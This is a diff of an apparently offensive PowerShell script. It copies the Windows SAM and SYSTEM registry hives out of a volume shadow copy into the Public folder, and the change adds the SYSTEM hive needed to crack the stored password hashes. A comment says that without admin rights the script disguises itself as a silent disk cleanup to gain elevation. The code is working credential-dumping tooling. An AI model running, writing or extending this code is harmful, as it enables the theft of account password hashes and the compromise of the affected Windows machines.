@@ -23,21 +23,23 @@ if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S
     $syslink2 = Get-WmiObject Win32_ShadowCopy | Where-Object { $_.ID -eq $syslink1.ShadowID }
     $directory = $syslink2.DeviceObject + "\\"
     $OutFile = $env:PUBLIC # Location to copied SAM (C:\Users\Public by default)
+    $VSS_Stopped = ((get-service vss).status -eq "Stopped")
+    
+        if ($VSS_Stopped){
+            Start-Service VSS
+        }
 
-    if ((get-service vss).status -eq "Stopped") {
-        Start-Service VSS
-        cmd /c mklink /d $env:SystemDrive\shadowcopy "$directory"
+        Start-Sleep -s 1
+        cmd /c mklink /d $env:SystemDrive\shadowcopy "$Directory"
         Start-Sleep -s 1
         Copy-Item -Path "$env:SystemDrive\shadowcopy\windows\system32\config\SAM" -destination "$OutFile" -recurse
+        Copy-Item -Path "$env:SystemDrive\shadowcopy\windows\system32\config\SYSTEM" -destination "$OutFile" -recurse
         cmd /c rmdir "$env:SystemDrive\shadowcopy"
         Start-Sleep -s 1
-        Stop-Service VSS
-    }
-    elseif ((get-service vss).status -eq "Running") {
-        cmd /c mklink /d $env:SystemDrive\shadowcopy "$directory"
-        Copy-Item -Path "$env:SystemDrive\shadowcopy\windows\system32\config\SAM" -destination "$OutFile" -recurse
-        cmd /c rmdir $env:SystemDrive\shadowcopy
-    }
+
+        if ($VSS_Stopped){
+            Stop-Service VSS
+        }
 }
 # If script is not called w/ admin priviliges, disguise self as silent disk cleanup and call it.
 else {
